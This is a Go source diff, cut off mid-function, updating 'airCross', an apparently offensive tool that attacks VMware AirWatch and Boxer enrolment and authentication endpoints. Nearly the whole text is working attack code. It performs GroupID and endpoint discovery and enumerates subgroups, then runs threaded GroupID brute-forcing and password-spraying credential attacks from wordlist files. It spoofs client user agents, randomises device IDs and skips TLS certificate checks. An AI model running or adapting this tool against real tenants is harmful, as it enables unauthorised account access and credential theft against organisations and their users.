@@ -7,20 +7,21 @@ import (
 	"io"
 	"log"
 	"os"
-	"regexp"
-	"strconv"
+	"sme/utils"
 	"strings"
 
 	"crypto/rand"
+	"crypto/tls"
 	"encoding/json"
 	"io/ioutil"
 	"net/http"
-	"net/url"
+	URL "net/url"
 )
 
 type attack struct {
 	agent       string
 	debug       bool
+	ddebug      bool
 	email       string
 	endpoint    string
 	groupID     string
@@ -31,10 +32,61 @@ type attack struct {
 	sid         string
 	subGroup    string
 	subGroupInt int
+	samlURL     string
 	threads     int
 	rudid       bool
 	udid        string
 	user        string
+	log         *logger
+}
+
+type url struct {
+	name   string
+	url    string
+	data   string
+	method string
+	opts   *map[string]interface{}
+}
+
+type logger struct {
+	stdout *log.Logger
+	stderr *log.Logger
+}
+
+type header struct {
+	SID string `json:"SessionId"`
+}
+
+type status struct {
+	Code         int    `json:"Code"`
+	Notification string `json:"Notification"`
+	StatusCode   string `json:"StatusCode"`
+}
+
+type validate struct {
+	Header header `json:"Header"`
+	Status status `json:"Status"`
+	Next   struct {
+		Block      string         `json:"EnrollmentBlockedMessage"`
+		Groups     map[string]int `json:"Groups"`
+		GroupID    string         `json:"GroupId"`
+		Type       int            `json:"Type"`
+		GreenBox   string         `json:"GreenBoxUrl"`
+		VIDMServer string         `json:"VidmServerUrl"`
+		CAPTCHA    bool           `json:"IsCaptchaRequired"`
+	} `json:"NextStep"`
+}
+
+type discoV1resp struct {
+	EnrollURL   string `json:"EnrollmentUrl"`
+	GroupID     string `json:"GroupId"`
+	TenantGroup string `json:"TenantGroup"`
+	GreenboxURL string `json:"GreenboxUrl"`
+	MDM         struct {
+		ServiceURL string `json:"deviceServicesUrl"`
+		APIURL     string `json:"apiServerUrl"`
+		GroupID    string `json:"organizationGroupId"`
+	} `json:"mdm"`
 }
 
 // Program constants
@@ -42,7 +94,7 @@ const (
 	iosAgent     = `VMwareBoxer/5199 CFNetwork/1121.2.2 Darwin/19.3.0`
 	androidAgent = `Agent/20.08.0.23/Android/11`
 
-	version = "1.0"
+	version = "2.0"
 	tool    = "airCross"
 	usage   = `
 Usage:
@@ -68,7 +120,8 @@ Global Options:
   <endpoint>             AirWatch endpoint FQDN
   <dom>                  Discovery domain
   <file>                 Line divided file containing GroupID or UserID values
-
+`
+	methods = `
 Methods:
   gid-disco              GroupID discovery query
   gid-val                GroupID validation query
@@ -78,579 +131,531 @@ Methods:
   auth-val               AirWatch single-factor credential validation attack
   auth-gid               Boxer authentication across multi-group tenants
 `
+
+	domainLookupV1           = `https://discovery.awmdm.com/autodiscovery/awcredentials.aws/v1/domainlookup/domain/%s`
+	domainLookupV2           = `https://discovery.awmdm.com/autodiscovery/awcredentials.aws/v2/domainlookup/domain/%s`
+	gbdomainLookupV2         = `https://discovery.awmdm.com/autodiscovery/DeviceRegistry.aws/v2/gbdomainlookup/domain/%s`
+	catalogPortal            = `https://%s/catalog-portal/services/api/adapters`
+	emailDiscovery           = `https://%s/DeviceManagement/Enrollment/EmailDiscovery`
+	validateGroupIdentifier  = `https://%s/deviceservices/enrollment/airwatchenroll.aws/validategroupidentifier`
+	validateGroupSelector    = `https://%s/deviceservices/enrollment/airwatchenroll.aws/validategroupselector`
+	authenticationEndpoint   = `https://%s/deviceservices/authenticationendpoint.aws`
+	validateLoginCredentials = `https://%s/deviceservices/enrollment/airwatchenroll.aws/validatelogincredentials`
+
+	POSTemailDiscovery             = `DevicePlatformId=2&EmailAddress=%s&FromGroupID=False&FromWelcome=False&Next=Next`
+	POSTvalidateGroupIdentifier    = `{"Header":{"SessionId":"00000000-0000-0000-0000-000000000000"},"Device":{"InternalIdentifier":"%s"},"GroupId":"%s"}`
+	POSTvalidateGroupSelector      = `{"Header":{"SessionId":"%s"},"Device":{"InternalIdentifier":"%s"},"GroupId":"%s","LocationGroupId":%d}`
+	POSTauthenticationEndpointJSON = `{"ActivationCode":"%s","BundleId":"com.box.email","Udid":"%s","Username":"%s",` +
+		`"AuthenticationType":"2","RequestingApp":"com.boxer.email","DeviceType":"2","Password":"%s","AuthenticationGroup":"com.air-watch.boxer"}`
+	POSTauthenticationEndpointXML = `<AWAuthenticationRequest><Username><![CDATA[%s]]></Username><Password><![CDATA[%s]]></Password>` +
+		`<ActivationCode><![CDATA[%s]]></ActivationCode><BundleId><![CDATA[com.boxer.email]]></BundleId><Udid><![CDATA[%s]]>` +
+		`</Udid><DeviceType>5</DeviceType><AuthenticationType>2</AuthenticationType><AuthenticationGroup><![CDATA[com.boxer.email]]>` +
+		`</AuthenticationGroup></AWAuthenticationRequest>`
+	POSTvalidateLoginCredentials = `{"Username":"%s","Password":"%s","Header":{"SessionId":"%s"},"SamlCompleteUrl":"aw:\/\/","Device":{"InternalIdentifier":"%s"}}`
 )
 
 // newUDID generates a random UUID according to RFC 4122
 func (a *attack) newUDID() {
-	uuid := make([]byte, 20)
+	uuid := make([]byte, 21)
 	n, err := io.ReadFull(rand.Reader, uuid)
 	if n != len(uuid) || err != nil {
 		fmt.Printf("[*] Error generating UDID: %v\n", err)
 	}
-	uuid[8] = uuid[8]&^0xc0 | 0x80
-	uuid[6] = uuid[6]&^0xf0 | 0x40
 	a.udid = fmt.Sprintf("%x", uuid)
 }
 
-// GroupID discovery function
-func (a *attack) disco() {
-	if a.groupID != "" {
-		a.call("val")
-	} else {
-		a.call("discov1")
-		if a.groupID == "" {
-			a.call("discov2")
-			if a.groupID == "" && a.email == "" {
-				fmt.Println("[*] Registration GroupID discovery requires email to be specified")
-				os.Exit(1)
-			} else if a.groupID == "" {
-				a.call("discov3")
-			}
-		}
-		a.call("val")
+// webCall is the helper function for executing an HTTP/HTTPS request
+func (a *attack) webCall(u *url) []byte {
+	tlsConfig := &tls.Config{
+		InsecureSkipVerify: true,
 	}
-}
+	transport := &http.Transport{TLSClientConfig: tlsConfig}
 
-func (a *attack) reqSetup(api string) (*http.Client, *http.Request) {
-	discoV1 := `https://discovery.awmdm.com/autodiscovery/awcredentials.aws/v1/domainlookup/domain/%s`
-	discoV2 := `https://discovery.awmdm.com/autodiscovery/awcredentials.aws/v2/domainlookup/domain/%s`
-	discoV3 := `https://%s/DeviceManagement/Enrollment/EmailDiscovery`
-	authV1 := `https://%s/deviceservices/authenticationendpoint.aws`                                // Boxer Authentication && Registration
-	authV2 := `https://%s/deviceservices/enrollment/airwatchenroll.aws/validatelogincredentials`    // AirWatch credential validation
-	validateV1 := `https://%s/deviceservices/enrollment/airwatchenroll.aws/validategroupidentifier` // Pull GroupID details
-	validateV2 := `https://%s/deviceservices/enrollment/airwatchenroll.aws/validategroupselector`   // Enumerate subgroups
-
-	client := &http.Client{}
+	client := &http.Client{
+		Transport: transport,
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			return http.ErrUseLastResponse
+		},
+	}
 	req := &http.Request{}
 	var err error
 
-	switch api {
-
-	// Phase 1 discovery request
-	case "discov1":
-		url := fmt.Sprintf(discoV1, a.endpoint)
-
-		req, err = http.NewRequest("GET", url, nil)
-		if err != nil {
-			a.Fatalf("(%s-%s) Request Error (%s):  %v", a.method, api, url, err)
-		}
-
-		// Phase 2 discovery request
-	case "discov2":
-		url := fmt.Sprintf(discoV2, a.endpoint)
-
-		req, err = http.NewRequest("GET", url, nil)
-		if err != nil {
-			a.Fatalf("(%s-%s) Request Error (%s):  %v", a.method, api, url, err)
-		}
-
-		// Pull GroupID value from HTTP request to /DeviceManagement/Enrollment/validate-userCredentials
-		// GroupID value is server generated within the Response Body of the changeActivationCode()
-		// or within the third 'else if' statement on the page
-	case "discov3":
-		// Change HTTP redirection to validate-userCredentials API Endpoint
-		client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
-			if _, ok := req.URL.Query()["sid"]; ok {
-				if len(req.URL.Query()["sid"]) < 1 {
-					return fmt.Errorf("emailDiscovery Failed")
-				}
-				if req.URL.Query()["sid"][0] == "00000000-0000-0000-0000-000000000000" {
-					return fmt.Errorf("emailDiscovery Disabled")
-				}
-			} else {
-				return fmt.Errorf("emailDiscovery Failed")
-			}
-
-			req.URL.Path = "/DeviceManagement/Enrollment/validate-userCredentials"
-			return nil
-		}
-
-		postData := fmt.Sprintf(`DevicePlatformId=2&EmailAddress=%s&FromGroupID=False&FromWelcome=False&Next=Next`, a.email)
-
-		url := fmt.Sprintf(discoV3, a.endpoint)
-
-		req, err = http.NewRequest("POST", url, bytes.NewBuffer([]byte(postData)))
-		if err != nil {
-			a.Fatalf("(%s-%s) Request Error (%s):  %v", a.method, api, url, err)
-		}
-
-		req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
-		req.Header.Add("Accept", "gzip, deflate")
-
-	case "authv1":
-		pdata := fmt.Sprintf(`{"ActivationCode":"%s","BundleId":"com.box.email","Udid":"%s","Username":"%s",`+
-			`"AuthenticationType":"2","RequestingApp":"com.boxer.email","DeviceType":"2","Password":"%s",`+
-			`"AuthenticationGroup":"com.air-watch.boxer"}`, a.groupID, a.udid, a.user, a.pass)
-
-		url := fmt.Sprintf(authV1, a.endpoint)
-
-		req, err = http.NewRequest("POST", url, bytes.NewBuffer([]byte(pdata)))
-		if err != nil {
-			a.Fatalf("(%s-%s) Request Error (%s):  %v", a.method, api, url, err)
-		}
-
-		req.Header.Add("Content-Type", "application/json; charset=utf-8")
-		req.Header.Add("Accept", "application/json; charset=utf-8")
-
-	case "authv2":
-		pdata := fmt.Sprintf(`<AWAuthenticationRequest><Username><![CDATA[%s]]></Username><Password><![CDATA[%s]]></Password>`+
-			`<ActivationCode><![CDATA[%s]]></ActivationCode><BundleId><![CDATA[com.boxer.email]]></BundleId><Udid><![CDATA[%s]]>`+
-			`</Udid><DeviceType>5</DeviceType><AuthenticationType>2</AuthenticationType><AuthenticationGroup><![CDATA[com.boxer.email]]>`+
-			`</AuthenticationGroup></AWAuthenticationRequest>`, a.user, a.pass, a.groupID, a.udid)
-
-		url := fmt.Sprintf(authV1, a.endpoint)
-
-		req, err = http.NewRequest("POST", url, bytes.NewBuffer([]byte(pdata)))
-		if err != nil {
-			a.Fatalf("(%s-%s) Request Error (%s):  %v", a.method, api, url, err)
-		}
-
-		req.Header.Add("Content-Type", "UTF-8")
-		req.Header.Add("Accept", "application/json")
-
-	case "authv3":
-		jsonstr := fmt.Sprintf(`{"Username":"%s","Password":"%s","Header":{"SessionId":"%s"},`+
-			`"SamlCompleteUrl":"aw:\/\/","Device":{"InternalIdentifier":"%s"}}`, a.user, a.pass, a.sid, a.udid)
-
-		url := fmt.Sprintf(authV2, a.endpoint)
-
-		req, err = http.NewRequest("POST", url, bytes.NewBuffer([]byte(jsonstr)))
-		if err != nil {
-			a.Fatalf("(%s-%s) Request Error (%s):  %v", a.method, api, url, err)
-		}
-		req.Header.Add("Content-Type", "application/json")
-
-	case "val", "valv1":
-		jsonstr := fmt.Sprintf(`{"Header":{"SessionId":"00000000-0000-0000-0000-000000000000"},`+
-			`"Device":{"InternalIdentifier":"%s"},"GroupId":"%s"}`, a.udid, a.groupID)
-
-		url := fmt.Sprintf(validateV1, a.endpoint)
-
-		req, err = http.NewRequest("POST", url, bytes.NewBuffer([]byte(jsonstr)))
-		if err != nil {
-			a.Fatalf("(%s-%s) Request Error (%s):  %v", a.method, api, url, err)
-		}
-		req.Header.Add("Content-Type", "application/json")
-
-	case "authv4":
-		pdata := fmt.Sprintf(`{"ActivationCode":"%s","BundleId":"com.box.email","Udid":"%s","Username":"%s",`+
-			`"AuthenticationType":"2","RequestingApp":"com.boxer.email","DeviceType":"2","Password":"%s",`+
-			`"AuthenticationGroup":"com.air-watch.boxer"}`, a.subGroup, a.udid, a.user, a.pass)
-
-		url := fmt.Sprintf(authV1, a.endpoint)
-
-		req, err = http.NewRequest("POST", url, bytes.NewBuffer([]byte(pdata)))
-		if err != nil {
-			a.Fatalf("(%s-%s) Request Error (%s):  %v", a.method, api, url, err)
-		}
-
-		req.Header.Add("Content-Type", "application/json; charset=utf-8")
-		req.Header.Add("Accept", "application/json; charset=utf-8")
-
-	case "valv2":
-		jsonstr := fmt.Sprintf(`{"Header":{"SessionId":"%s"},"Device":{"InternalIdentifier":"%s"},`+
-			`"GroupId":"%s","LocationGroupId":%d}`, a.sid, a.udid, a.subGroup, a.subGroupInt)
-
-		url := fmt.Sprintf(validateV2, a.endpoint)
-
-		req, err = http.NewRequest("POST", url, bytes.NewBuffer([]byte(jsonstr)))
-		if err != nil {
-			a.Fatalf("(%s-%s) Request Error (%s):  %v", a.method, api, url, err)
-		}
-		req.Header.Add("Content-Type", "application/json")
-
-	default:
-		a.Fatalf("%s Incorrect API Request", api)
+	req, err = http.NewRequest(u.method, u.url, bytes.NewBuffer([]byte(u.data)))
+	if err != nil {
+		a.log.Fatalf(nil, "Request Error (%s):  %v", u, err)
 	}
 
-	req.Header.Add("User-Agent", a.agent)
-	return client, req
-}
+	// Switch loop across the []interface{} array
+	for k, v := range *u.opts {
+		switch k {
+		case "Header":
+			req.Header = v.(map[string][]string)
+		case "CheckRedirect":
+			client.CheckRedirect = v.(func(*http.Request, []*http.Request) error)
+		}
+	}
 
-// Function for basic web connection against Boxer API endpoint and AirWatch discovery API
-// this URI destination is leveraged for both GroupID/UserID bruteforce attempts
-func (a *attack) call(api string) {
-	client, req := a.reqSetup(api)
-	var err error
+	if a.debug {
+		a.log.Debugf([]interface{}{u.name}, "REQUEST HEADER: %s %s %s", req.URL, req.Proto, req.Header)
+		if a.ddebug {
+			a.log.Debugf([]interface{}{u.name}, "REQUEST BODY: %s", req.Body)
+		}
+	}
 
 	resp, err := client.Do(req)
 	if err != nil {
-		a.Fatalf("%s Dial Error: %v", api, err)
+		a.log.Errorf([]interface{}{u.name}, "Dial Error: %v", err)
+		return nil
 	}
 
 	defer resp.Body.Close()
 	bodyBytes, err := ioutil.ReadAll(resp.Body)
 	if err != nil {
-		a.Errorf("%s Unable to read response: %v", err)
-	}
-
-	if resp.StatusCode != 200 {
-		a.Errorf("%s Invalid Response Code: %s - %d", api, req.URL.Hostname(), resp.StatusCode)
-		return
+		a.log.Errorf([]interface{}{u.name}, "Unable to read response: %v", err)
 	}
 	resp.Body.Close()
 
-	type discoV1resp struct {
-		EnrollURL string `json:"EnrollmentUrl"`
-		GroupID   string `json:"GroupId"`
+	if resp.StatusCode != 200 {
+		a.log.Errorf([]interface{}{u.name}, "Invalid Response Code: %s - %d", req.URL.Hostname(), resp.StatusCode)
+		return nil
 	}
 
-	type authV1resp struct {
-		StatusCode string `json:"StatusCode"`
+	if a.ddebug {
+		a.log.Debugf(nil, "RESPONSE BODY: %s", bodyBytes)
 	}
 
-	type header struct {
-		SID string `json:"SessionId"`
+	return bodyBytes
+}
+
+// disco representes the discovery process to locate and AirWatch
+// authentication endpoint and GroupID
+func (a *attack) disco() {
+	urls := []url{
+		url{`domainLookupV1`, fmt.Sprintf(domainLookupV1, a.endpoint), "", `GET`,
+			&map[string]interface{}{"Header": map[string][]string{"User-Agent": []string{a.agent}}}},
+		url{`domainLookupV2`, fmt.Sprintf(domainLookupV2, a.endpoint), "", `GET`,
+			&map[string]interface{}{"Header": map[string][]string{"User-Agent": []string{a.agent}}}},
+		url{`gbdomainLookupV2`, fmt.Sprintf(gbdomainLookupV2, a.endpoint), "", `GET`,
+			&map[string]interface{}{"Header": map[string][]string{"User-Agent": []string{a.agent}}}},
+		url{`catalogPortal`, fmt.Sprintf(catalogPortal, a.samlURL), "", `GET`,
+			&map[string]interface{}{
+				"Header": map[string][]string{
+					"User-Agent":   []string{a.agent},
+					"Content-Type": []string{"application/x-www-form-urlencoded"},
+					"Accept":       []string{"gzip, deflate"}}}},
+		url{`emailDiscovery`, fmt.Sprintf(emailDiscovery, a.endpoint), fmt.Sprintf(POSTemailDiscovery, a.email), `POST`,
+			&map[string]interface{}{
+				"Header": map[string][]string{
+					"User-Agent":   []string{a.agent},
+					"Content-Type": []string{"application/x-www-form-urlencoded"},
+					"Accept":       []string{"gzip, deflate"}},
+				"CheckRedirect": func(req *http.Request, via []*http.Request) error {
+					if _, ok := req.URL.Query()["sid"]; ok {
+						if len(req.URL.Query()["sid"]) < 1 {
+							return fmt.Errorf("Invalid SID length - emailDiscovery Failed")
+						}
+						if req.URL.Query()["sid"][0] == "00000000-0000-0000-0000-000000000000" {
+							return fmt.Errorf("Invalid SID - emailDiscovery Disabled")
+						}
+					} else {
+						return fmt.Errorf("emailDiscovery Failed")
+					}
+
+					req.URL.Path = "/DeviceManagement/Enrollment/validate-userCredentials"
+					return nil
+				}}},
 	}
 
-	type status struct {
-		Code         int    `json:"Code"`
-		Notification string `json:"Notification"`
-	}
+	check := false
+	for _, u := range urls {
+		switch u.name {
+		case `emailDiscovery`:
+			if a.email == "" {
+				a.log.Errorf([]interface{}{u.name}, "Requires user email address")
+				continue
+			}
+		}
 
-	type nextStep struct {
-		Groups     map[string]int `json:"Groups"`
-		GroupID    string         `json:"GroupId"`
-		Type       int            `json:"Type"`
-		GreenBox   string         `json:"GreenBoxUrl"`
-		VIDMServer string         `json:"VidmServerUrl"`
-		CAPTCHA    bool           `json:"IsCaptchaRequired"`
-	}
+		bodyBytes := a.webCall(&u)
+		if bodyBytes == nil {
+			continue
+		}
 
-	type validate struct {
-		Header header   `json:"Header"`
-		Status status   `json:"Status"`
-		Next   nextStep `json:"NextStep"`
-	}
-
-	switch api {
-	case "discov1", "discov2":
 		bresp := &discoV1resp{}
 		err := json.Unmarshal(bodyBytes, bresp)
 		if err != nil {
-			a.Errorf("%s Response Marshall Error: %v", err)
+			a.log.Errorf(nil, "Response Marshall Error: %v", err)
 		}
-
-		if bresp.EnrollURL != "" {
-			endp, _ := url.Parse(bresp.EnrollURL)
-			a.endpoint = endp.Hostname()
-			a.Successf("%s: Successful Endpoint Discovery", a.endpoint)
-		} else {
-			a.Failf("%s - Failed GroupID Discovery", api)
-		}
-		if bresp.GroupID != "" {
-			a.groupID = bresp.GroupID
-			a.Successf("Successful GroupID Discovery")
-		} else {
-			a.Failf("%s - Failed GroupID Discovery", api)
-		}
-
-	case "discov3":
-		re := regexp.MustCompile(`else if \('(.*?)'`)
-		sub := re.FindAllStringSubmatch(string(bodyBytes), 1)
-		if len(sub) < 1 || sub[0][1] == "" {
-			a.Failf("Failed GroupID Discovery")
+		if check = a.validate(bresp); check {
 			return
 		}
-
-		a.groupID = sub[0][1]
-		a.Successf("Successful GroupID Discovery")
-
-	case "authv1", "authv2", "authv4":
-		bresp := &authV1resp{}
-		err := json.Unmarshal(bodyBytes, bresp)
-		if err != nil {
-			a.Errorf("%s Response Marshall Error: %v", api, err)
-		}
-		a.boxStatus(bresp.StatusCode)
-
-	case "authv3":
-		bresp := &validate{}
-		err := json.Unmarshal(bodyBytes, bresp)
-		if err != nil {
-			a.Errorf("%s Response Marshall Error: %v", api, err)
-		}
-		a.valCredStatus(bresp.Status.Code, bresp.Status.Notification)
-
-	case "val":
-		bresp := &validate{}
-		err := json.Unmarshal(bodyBytes, bresp)
-		if err != nil {
-			a.Errorf("%s Response Marshall Error: %v", api, err)
-		}
-
-		if len(bresp.Next.Groups) > 0 {
-			if a.method == "gid-disco" {
-				a.Infof("Endpoint %s contains %d groups", a.endpoint, len(bresp.Next.Groups))
-				a.Infof("Run gid-val method for full listing")
-			}
-			if a.method == "gid-val" {
-				fmt.Printf("[*] Endpoint %s contains %d groups\n", a.endpoint, len(bresp.Next.Groups))
-				for key, val := range bresp.Next.Groups {
-					a.subGroup = key
-					a.subGroupInt = val
-					a.Successf("SubGroup Discovery")
-				}
-			}
-		}
-
-		if a.method == "gid-val" || a.method == "gid-disco" {
-			a.valStatus(bresp.Next.Type)
-			if a.debug {
-				a.Debugf("Group Body: %s", string(bodyBytes))
-			}
-		}
-
-	case "valv1":
-		bresp := &validate{}
-		err := json.Unmarshal(bodyBytes, bresp)
-		if err != nil {
-			a.Errorf("%s Response Marshall Error: %v", api, err)
-		}
-		a.groups = bresp.Next.Groups
-		a.sid = bresp.Header.SID
-
-	case "valv2":
-		bresp := &validate{}
-		err := json.Unmarshal(bodyBytes, bresp)
-		if err != nil {
-			a.Errorf("%s Response Marshall Error: %v", api, err)
-		}
-		a.sid = bresp.Header.SID
-		a.subGroup = bresp.Next.GroupID
+	}
+	if !check {
+		a.log.Failf(nil, "Discovery Failed")
 	}
 }
 
-// Threaded requests against API methods
-func (a *attack) brute() {
-	var file []byte
-
-	if a.file == "" {
-		file = []byte("")
-	} else {
-		f, err := os.Open(a.file)
-		if err != nil {
-			a.Fatalf("File open Failure: %s - %v", a.file, err)
+// prof represents the function call to validate the setup
+// of the AirWatch environment. Some request methods are executed
+// across two queries where details from the first request need to be
+// injected to the next.
+func (a *attack) prof() {
+	check := false
+	for i := 0; i < 2; i++ {
+		urls := []url{
+			url{`validateGroupIdentifier`, fmt.Sprintf(validateGroupIdentifier, a.endpoint),
+				fmt.Sprintf(POSTvalidateGroupIdentifier, a.udid, a.groupID), `POST`,
+				&map[string]interface{}{
+					"Header": map[string][]string{
+						"User-Agent":   []string{a.agent},
+						"Content-Type": []string{"application/json"}}}},
+			url{`validateGroupSelector`, fmt.Sprintf(validateGroupSelector, a.endpoint),
+				fmt.Sprintf(POSTvalidateGroupSelector, a.sid, a.udid, a.subGroup, a.subGroupInt), `POST`,
+				&map[string]interface{}{
+					"Header": map[string][]string{
+						"User-Agent":   []string{a.agent},
+						"Content-Type": []string{"application/json"}}}},
 		}
-		defer f.Close()
 
-		file, _ = ioutil.ReadAll(f)
-		f.Close()
+		bodyBytes := a.webCall(&urls[i])
+		if bodyBytes == nil {
+			continue
+		}
+
+		bresp := &validate{}
+		err := json.Unmarshal(bodyBytes, bresp)
+		if err != nil {
+			a.log.Errorf(nil, "Response Marshall Error: %v", err)
+		}
+		a.sid = bresp.Header.SID     //Populate SID
+		a.groups = bresp.Next.Groups //Populate SubGruops
+		if a.method == "auth-val" {
+			return
+		}
+		if len(bresp.Next.Groups) > 0 && (a.subGroup != "" && a.subGroupInt != 0) {
+			if a.method == "auth-gid" {
+				return
+			}
+			a.log.Infof([]interface{}{a.endpoint, len(bresp.Next.Groups)}, "SubGroups Available")
+			for k, v := range bresp.Next.Groups {
+				a.log.Successf([]interface{}{k, v}, "SubGroup Identified")
+			}
+		} else if a.subGroup != "" && a.subGroupInt != 0 {
+			check = a.validate(bresp.Next.Type)
+		} else {
+			check = a.validate(bresp.Next.Type)
+			return
+		}
+	}
+	if !check {
+		a.log.Failf(nil, "Profiling Failed")
+	}
+}
+
+// auth represents the setup framework to build the
+// various authentication attack methods
+func (a *attack) auth() {
+	var file []byte
+	var err error
+
+	if a.file != "" {
+		file, err = utils.ReadFile(a.file)
+		if err != nil {
+			a.log.Fatalf([]interface{}{a.file}, "File Read Failure")
+		}
 	}
 
-	lines := len(strings.Split(string(file), "\n"))
-	thread := make(chan bool, lines)
+	lines := strings.Split(string(file), "\n")
+	thread := make(chan bool, len(lines))
 	buff := make(chan bool, a.threads)
 
-	a.Infof("%s threading %d values across %d threads", a.method, lines, a.threads)
-	for _, line := range strings.Split(string(file), "\n") {
-		if lines > 1 && line == "" {
+	if a.method != "auth-gid" {
+		a.log.Infof(nil, "threading %d values across %d threads", len(lines), a.threads)
+	}
+	for _, line := range lines {
+		if len(lines) > 1 && line == "" {
 			thread <- true
 			continue
 		}
-		if a.rudid {
-			a.newUDID()
-		}
 
-		buff <- true
-		go func(a attack, val string) {
-			switch a.method {
-			case "gid-brute":
-				if val != "" {
-					a.groupID = val
-				}
-				a.call("authv1")
+		var req url
+		target := &attack{}
+		*target = *a
 
-			case "auth-boxer":
-				if val != "" {
-					a.user = val
-				}
-				a.call("authv1")
+		switch target.method {
+		case "gid-brute":
+			if line != "" {
+				target.groupID = line
+			}
+			req.name = `authenticationEndpoint`
+			req.url = fmt.Sprintf(authenticationEndpoint, target.endpoint)
+			req.data = fmt.Sprintf(POSTauthenticationEndpointJSON, target.groupID, target.udid, target.user, target.pass)
+			req.method = `POST`
+			req.opts = &map[string]interface{}{
+				"Header": map[string][]string{
+					"User-Agent":   []string{target.agent},
+					"Content-Type": []string{"application/json"},
+					"Accept":       []string{"application/json; charset=utf-8"}}}
 
-			case "auth-reg":
-				if val != "" {
-					a.user = val
-				}
-				a.call("authv2")
+		case "auth-boxer":
+			if line != "" {
+				target.user = line
+			}
+			req.name = `authenticationEndpoint`
+			req.url = fmt.Sprintf(authenticationEndpoint, target.endpoint)
+			req.data = fmt.Sprintf(POSTauthenticationEndpointJSON, target.groupID, target.udid, target.user, target.pass)
+			req.method = `POST`
+			req.opts = &map[string]interface{}{
+				"Header": map[string][]string{
+					"User-Agent":   []string{target.agent},
+					"Content-Type": []string{"application/json; charset=utf-8"},
+					"Accept":       []string{"application/json; charset=utf-8"}}}
 
-			case "auth-val":
-				if val != "" {
-					a.user = val
-				}
-				a.call("valv1")
-				if len(a.groups) > 0 {
-					a.call("valv2")
-				}
-				a.call("authv3")
+		case "auth-reg":
+			if line != "" {
+				target.user = line
+			}
+			req.name = `authenticationEndpoint`
+			req.url = fmt.Sprintf(authenticationEndpoint, target.endpoint)
+			req.data = fmt.Sprintf(POSTauthenticationEndpointXML, target.user, target.pass, target.groupID, target.rudid)
+			req.method = `POST`
+			req.opts = &map[string]interface{}{
+				"Header": map[string][]string{
+					"User-Agent":   []string{target.agent},
+					"Content-Type": []string{"UTF-8"},
+					"Accept":       []string{"application/json"}}}
+
+		case "auth-val":
+			a.prof() // capture SID
+			if line != "" {
+				target.user = line
 			}
 
-			<-buff
-			thread <- true
-		}(*a, line)
+			req.name = `validateLoginCredentials`
+			req.url = fmt.Sprintf(validateLoginCredentials, target.endpoint)
+			req.data = fmt.Sprintf(POSTvalidateLoginCredentials, target.user, target.pass, target.sid, target.udid)
+			req.method = `POST`
+			req.opts = &map[string]interface{}{
+				"Header": map[string][]string{
+					"User-Agent":   []string{target.agent},
+					"Content-Type": []string{"UTF-8"},
+					"Accept":       []string{"application/json"}}}
+
+		case "auth-gid":
+			target.prof() // capture SubGroups
+			if line != "" {
+				target.user = line
+			}
+			a.log.Infof(nil, "threading %d values across %d threads", len(lines)*len(target.groups), target.threads)
+
+			for key, val := range target.groups {
+				target.subGroup = key
+				target.subGroupInt = val
+
+				req.name = `authenticationEndpoint`
+				req.url = fmt.Sprintf(authenticationEndpoint, target.endpoint)
+				req.data = fmt.Sprintf(POSTauthenticationEndpointJSON, target.subGroup, target.udid, target.user, target.pass)
+				req.method = `POST`
+				req.opts = &map[string]interface{}{
+					"Header": map[string][]string{
+						"User-Agent":   []string{target.agent},
+						"Content-Type": []string{"application/json; charset=utf-8"},
+						"Accept":       []string{"application/json; charset=utf-8"}}}
+
+				target.thread(&buff, &thread, &req)
+			}
+			continue
+		}
+
+		target.thread(&buff, &thread, &req)
 	}
 
 	close(buff)
-	for i := 0; i < lines; i++ {
+	for i := 0; i < len(lines); i++ {
 		<-thread
 	}
 	close(thread)
+
 }
 
-func (a *attack) thread() {
-	thread := make(chan bool, len(a.groups))
-	buff := make(chan bool, a.threads)
+// thread represents the threading process to loop multiple requests
+func (a *attack) thread(buff, thread *chan bool, req *url) {
+	if a.rudid {
+		a.newUDID()
+	}
 
-	a.call("valv1")
-	a.Infof("%s threading %d values across %d threads", a.method, len(a.groups), a.threads)
+	*buff <- true
+	go func() {
+		bodyBytes := a.webCall(req)
+		if bodyBytes == nil {
+			a.log.Failf([]interface{}{a.user, a.pass, a.groupID}, "Null Server Response")
+		} else {
 
-	if len(a.groups) < 1 {
-		thread <- true
-		a.brute()
-	} else {
-		for key, val := range a.groups {
-			if a.rudid {
-				a.newUDID()
+			if a.method == "auth-val" {
+				bresp := &validate{}
+				err := json.Unmarshal(bodyBytes, bresp)
+				if err != nil {
+					a.log.Errorf(nil, "Response Marshall Error: %v", err)
+				}
+				a.validate(bresp.Next.Type)
+
+			} else {
+				bresp := &status{}
+				err := json.Unmarshal(bodyBytes, bresp)
+				if err != nil {
+					a.log.Errorf(nil, "Response Marshall Error: %v", err)
+				}
+				if bresp.StatusCode == "" {
+					a.validate(bresp)
+				} else {
+					a.validate(bresp.StatusCode)
+				}
 			}
-
-			buff <- true
-			go func(a attack, key string, val int) {
-				a.subGroup = key
-				a.subGroupInt = val
-				a.call("valv2")
-				a.call("authv4")
-
-				<-buff
-				thread <- true
-			}(*a, key, val)
-
 		}
 
-		close(buff)
-		for i := 0; i < len(a.groups); i++ {
-			<-thread
+		<-*buff
+		*thread <- true
+	}()
+}
+
+// validate takes an interface of results and validation details
+func (a *attack) validate(res interface{}) bool {
+	switch res.(type) {
+	case *discoV1resp:
+		r := res.(*discoV1resp)
+		if r.EnrollURL != "" {
+			endp, _ := URL.Parse(r.EnrollURL)
+			a.log.Successf([]interface{}{endp.Hostname()}, "Endpoint Discovery")
+		} else if r.GreenboxURL != "" {
+			endp, _ := URL.Parse(r.GreenboxURL)
+			a.samlURL = endp.Hostname()
+			a.log.Successf([]interface{}{endp.Hostname()}, "SAML Endpoint Discovery")
+			return true
+		} else if r.MDM.ServiceURL != "" {
+			endp, _ := URL.Parse(r.MDM.ServiceURL)
+			a.log.Successf([]interface{}{endp.Hostname()}, "Endpoint Discovery")
+			return true
 		}
-		close(thread)
-	}
-}
+		if r.GroupID != "" {
+			a.log.Successf([]interface{}{r.GroupID}, "GroupID Discovery")
+			return true
+		} else if r.TenantGroup != "" {
+			a.log.Successf([]interface{}{r.TenantGroup}, "Tenant Discovery")
+			return true
+		} else if r.MDM.GroupID != "" {
+			a.log.Successf([]interface{}{r.MDM.GroupID}, "GroupID Discovery")
+			return true
+		}
 
-// Identified validatelogincredentials values
-func (a *attack) valCredStatus(code int, status string) {
-	switch code {
-	case 1:
-		a.Successf("Authentication Successful - Code: %d: %s", code, status)
-	case 2:
